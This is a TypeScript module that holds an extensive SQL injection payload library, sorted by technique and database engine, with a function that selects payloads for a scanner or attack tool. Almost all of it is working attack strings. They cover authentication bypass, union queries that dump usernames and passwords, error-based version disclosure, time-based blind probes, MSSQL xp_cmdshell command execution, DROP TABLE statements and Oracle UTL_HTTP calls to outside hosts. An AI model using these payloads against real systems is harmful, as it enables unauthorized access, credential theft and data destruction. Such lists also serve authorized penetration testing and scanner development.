// This file contains SQL injection payloads from the imported data
// Organized by injection type and database system

export const payloads = {
  // Authentication bypass payloads
  authBypass: [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR 1=1--",
    '" OR 1=1--',
    "or 1=1--",
    "' or 1=1--",
    '" or 1=1--',
    "') OR ('1'='1",
    "')) OR (('1'='1",
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin' or '1'='1",
    "admin' or '1'='1'--",
    "admin' or '1'='1'#",
    "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='",
    "admin') or ('1'='1",
    "admin') or ('1'='1'--",
  ],

  // Error-based injection payloads
  errorBased: {
    mysql: [
      "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '1'='1",
      "' AND extractvalue(rand(),concat(0x3a,(SELECT version()))) AND '1'='1",
      "' AND updatexml(rand(),concat(0x3a,(SELECT version())),null) AND '1'='1",
      "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171706a71,(SELECT CAST(CURRENT_USER() AS CHAR),0x7171706a71))s), 8446744073709551610, 8446744073709551610)))",
    ],
    mssql: [
      "' AND 1=convert(int,(SELECT @@version)) AND '1'='1",
      "' AND 1=convert(int,(SELECT user)) AND '1'='1",
      "' AND 1=convert(int,(SELECT @@servername)) AND '1'='1",
      "'; IF (SELECT COUNT(*) FROM sysobjects WHERE name = 'mytable') > 0 DROP TABLE mytable--",
    ],
    oracle: [
      "' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1)) AND '1'='1",
      "' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1)) AND '1'='1",
      "' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",
    ],
    postgresql: [
      "' AND 1=cast((SELECT version()) as int) AND '1'='1",
      "' AND 1=cast((SELECT current_database()) as int) AND '1'='1",
      "' AND 1=cast((SELECT user) as int) AND '1'='1",
      "' AND 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 1) as int) AND '1'='1",
    ],
  },

  // Union-based injection payloads
  unionBased: {
    generic: [
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT 1,2,3--",
      "' UNION SELECT 1,2,3,4--",
      "' UNION SELECT 1,2,3,4,5--",
      "' UNION ALL SELECT NULL--",
      "' UNION ALL SELECT NULL,NULL--",
      "' UNION ALL SELECT NULL,NULL,NULL--",
    ],
    mysql: [
      "' UNION SELECT @@version,NULL#",
      "' UNION SELECT user(),NULL#",
      "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()#",
      "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'#",
      "' UNION SELECT CONCAT(username,':',password),NULL FROM users#",
    ],
    mssql: [
      "' UNION SELECT @@version,NULL--",
      "' UNION SELECT user,NULL FROM master..syslogins--",
      "' UNION SELECT name,NULL FROM master..sysdatabases--",
      "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
      "' UNION SELECT name,NULL FROM syscolumns WHERE id=object_id('users')--",
    ],
    oracle: [
      "' UNION SELECT banner,NULL FROM v$version--",
      "' UNION SELECT username,NULL FROM all_users--",
      "' UNION SELECT table_name,NULL FROM all_tables--",
      "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--",
    ],
    postgresql: [
      "' UNION SELECT version(),NULL--",
      "' UNION SELECT current_user,NULL--",
      "' UNION SELECT table_name,NULL FROM information_schema.tables--",
      "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
    ],
  },

  // Blind SQL injection payloads
  blind: {
    boolean: [
      "' AND 1=1--",
      "' AND 1=2--",
      "' AND substring(@@version,1,1)='5'--",
      "' AND ascii(substring((SELECT database()),1,1))=115--",
      "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)=1--",
      "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",
    ],
    time: [
      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      "' AND SLEEP(5)--",
      "'; WAITFOR DELAY '0:0:5'--",
      "' AND 1=(SELECT COUNT(*) FROM generate_series(1,5000000))--",
      "' AND pg_sleep(5)--",
      "' AND dbms_pipe.receive_message(('a'),5)=1--",
    ],
  },

  // Database-specific payloads
  databaseSpecific: {
    mysql: [
      "' OR IF(1=1,SLEEP(5),0)--",
      "' OR SLEEP(5)#",
      "' OR BENCHMARK(5000000,MD5(1))#",
      "' OR ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(VERSION(),0x3a),FLOOR(RAND(0)*2)) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2)))#",
    ],
    mssql: [
      "'; WAITFOR DELAY '0:0:5'--",
      "'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--",
      "'; EXEC master..xp_cmdshell('ping -n 5 127.0.0.1')--",
      "'; IF (SELECT COUNT(*) FROM sysobjects WHERE name = 'mytable') > 0 DROP TABLE mytable--",
    ],
    oracle: [
      "' || dbms_pipe.receive_message(('a'),5)--",
      "' || UTL_HTTP.REQUEST('http://example.com')--",
      "' || UTL_INADDR.GET_HOST_ADDRESS('example.com')--",
      "' || DBMS_LOCK.SLEEP(5)--",
    ],
    postgresql: [
      "' || pg_sleep(5)--",
      "' || SELECT pg_sleep(5)--",
      "' || SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
      "' || (SELECT * FROM generate_series(1,5000000))--",
    ],
    sqlite: [
      "' || sqlite_version()--",
      "' UNION SELECT sqlite_version()--",
      "' AND (SELECT count(*) FROM sqlite_master)>0--",
      "' AND (SELECT sqlite_version()) IS NOT NULL--",
    ],
  },

  // Polyglot payloads that work across multiple database systems
  polyglots: [
    "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
    "SELECT IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1' GROUP BY 1--+",
    "1' GROUP BY 2--+",
    "1' GROUP BY 3--+",
    "' UNION SELECT @@version,NULL#",
    "' UNION SELECT @@version,NULL,NULL#",
    "' UNION SELECT @@version,NULL,NULL,NULL#",
  ],
}

// Function to get payloads based on database type and injection technique
export function getPayloads(dbType: string | null = null, injectionType: string | null = null): string[] {
  let selectedPayloads: string[] = []

  // If no specific database or injection type is specified, return a mix of payloads
  if (!dbType && !injectionType) {
    selectedPayloads = [
      ...payloads.authBypass.slice(0, 5),
      ...payloads.errorBased.mysql.slice(0, 2),
      ...payloads.errorBased.mssql.slice(0, 2),
      ...payloads.errorBased.oracle.slice(0, 2),
      ...payloads.errorBased.postgresql.slice(0, 2),
      ...payloads.unionBased.generic.slice(0, 5),
      ...payloads.blind.boolean.slice(0, 3),
      ...payloads.blind.time.slice(0, 3),
      ...payloads.polyglots.slice(0, 5),
    ]
    return selectedPayloads
  }

  // Get payloads for a specific database type
  if (dbType && !injectionType) {
    switch (dbType.toLowerCase()) {
      case "mysql":
        selectedPayloads = [
          ...payloads.errorBased.mysql,
          ...payloads.unionBased.mysql,
          ...payloads.databaseSpecific.mysql,
        ]
        break
      case "mssql":
        selectedPayloads = [
          ...payloads.errorBased.mssql,
          ...payloads.unionBased.mssql,
          ...payloads.databaseSpecific.mssql,
        ]
        break
      case "oracle":
        selectedPayloads = [
          ...payloads.errorBased.oracle,
          ...payloads.unionBased.oracle,
          ...payloads.databaseSpecific.oracle,
        ]
        break
      case "postgresql":
        selectedPayloads = [
          ...payloads.errorBased.postgresql,
          ...payloads.unionBased.postgresql,
          ...payloads.databaseSpecific.postgresql,
        ]
        break
      case "sqlite":
        selectedPayloads = [...payloads.databaseSpecific.sqlite]
        break
      default:
        // If database type is not recognized, return generic payloads
        selectedPayloads = [
          ...payloads.authBypass,
          ...payloads.unionBased.generic,
          ...payloads.blind.boolean,
          ...payloads.blind.time.slice(0, 2),
          ...payloads.polyglots,
        ]
    }
    return selectedPayloads
  }

  // Get payloads for a specific injection type
  if (injectionType && !dbType) {
    switch (injectionType.toLowerCase()) {
      case "auth":
      case "authentication":
      case "bypass":
        selectedPayloads = [...payloads.authBypass]
        break
      case "error":
      case "errorbased":
        selectedPayloads = [
          ...payloads.errorBased.mysql,
          ...payloads.errorBased.mssql,
          ...payloads.errorBased.oracle,
          ...payloads.errorBased.postgresql,
        ]
        break
      case "union":
      case "unionbased":
        selectedPayloads = [
          ...payloads.unionBased.generic,
          ...payloads.unionBased.mysql,
          ...payloads.unionBased.mssql,
          ...payloads.unionBased.oracle,
          ...payloads.unionBased.postgresql,
        ]
        break
      case "blind":
      case "boolean":
        selectedPayloads = [...payloads.blind.boolean]
        break
      case "time":
      case "timebased":
        selectedPayloads = [...payloads.blind.time]
        break
      case "polyglot":
        selectedPayloads = [...payloads.polyglots]
        break
      default:
        // If injection type is not recognized, return a mix of payloads
        selectedPayloads = [
          ...payloads.authBypass.slice(0, 5),
          ...payloads.unionBased.generic.slice(0, 5),
          ...payloads.blind.boolean.slice(0, 3),
          ...payloads.blind.time.slice(0, 3),
          ...payloads.polyglots.slice(0, 5),
        ]
    }
    return selectedPayloads
  }

  // Get payloads for a specific database type and injection technique
  if (dbType && injectionType) {
    const db = dbType.toLowerCase()
    const injection = injectionType.toLowerCase()

    if (injection === "auth" || injection === "authentication" || injection === "bypass") {
      return [...payloads.authBypass]
    }

    if (injection === "error" || injection === "errorbased") {
      switch (db) {
        case "mysql":
          return [...payloads.errorBased.mysql]
        case "mssql":
          return [...payloads.errorBased.mssql]
        case "oracle":
          return [...payloads.errorBased.oracle]
        case "postgresql":
          return [...payloads.errorBased.postgresql]
        default:
          return [
            ...payloads.errorBased.mysql,
            ...payloads.errorBased.mssql,
            ...payloads.errorBased.oracle,
            ...payloads.errorBased.postgresql,
          ]
      }
    }

    if (injection === "union" || injection === "unionbased") {
      switch (db) {
        case "mysql":
          return [...payloads.unionBased.mysql]
        case "mssql":
          return [...payloads.unionBased.mssql]
        case "oracle":
          return [...payloads.unionBased.oracle]
        case "postgresql":
          return [...payloads.unionBased.postgresql]
        default:
          return [...payloads.unionBased.generic]
      }
    }

    if (injection === "blind" || injection === "boolean") {
      return [...payloads.blind.boolean]
    }

    if (injection === "time" || injection === "timebased") {
      return [...payloads.blind.time]
    }

    if (db === "mysql") {
      return [...payloads.databaseSpecific.mysql]
    }

    if (db === "mssql") {
      return [...payloads.databaseSpecific.mssql]
    }

    if (db === "oracle") {
      return [...payloads.databaseSpecific.oracle]
    }

    if (db === "postgresql") {
      return [...payloads.databaseSpecific.postgresql]
    }

    if (db === "sqlite") {
      return [...payloads.databaseSpecific.sqlite]
    }
  }

  // Default: return a mix of payloads
  return [
    ...payloads.authBypass.slice(0, 5),
    ...payloads.unionBased.generic.slice(0, 5),
    ...payloads.blind.boolean.slice(0, 3),
    ...payloads.blind.time.slice(0, 3),
    ...payloads.polyglots.slice(0, 5),
  ]
}
